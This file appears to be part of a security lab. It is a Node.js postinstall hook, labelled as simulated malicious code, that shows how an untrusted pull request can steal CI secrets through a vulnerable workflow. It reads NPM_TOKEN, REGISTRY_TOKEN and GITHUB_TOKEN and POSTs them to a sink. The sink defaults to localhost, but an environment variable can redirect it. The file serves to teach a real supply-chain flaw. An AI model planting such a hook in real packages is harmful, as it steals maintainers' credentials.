#!/usr/bin/env node
'use strict';

/*
 * SIMULATED MALICIOUS POSTINSTALL HOOK
 *
 * This file represents code an attacker added to their pull request. Because the
 * vulnerable workflow checks out the PR head and runs `npm install` on it, this
 * script executes on the runner with the maintainers' secrets in the environment.
 *
 * A real payload would exfiltrate to an attacker-controlled server. To keep this
 * lab safe and self-contained, it only POSTs to a listener on localhost that the
 * harness started, and prints what it captured.
 */

const http = require('http');

const SINK = process.env.EXFIL_SINK || 'http://127.0.0.1:9999/collect';

const stolen = {
  note: 'postinstall hook from untrusted PR executed on the runner',
  NPM_TOKEN: process.env.NPM_TOKEN || null,
  REGISTRY_TOKEN: process.env.REGISTRY_TOKEN || null,
  GITHUB_TOKEN: process.env.GITHUB_TOKEN || null,
};

console.log('[malicious postinstall] running with environment access');
console.log('[malicious postinstall] captured secrets:', JSON.stringify(stolen));

try {
  const url = new URL(SINK);
  const body = JSON.stringify(stolen);
  const req = http.request(
    {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    },
    (res) => res.resume()
  );
  req.on('error', () => { });
  req.write(body);
  req.end();
} catch (_) {
}
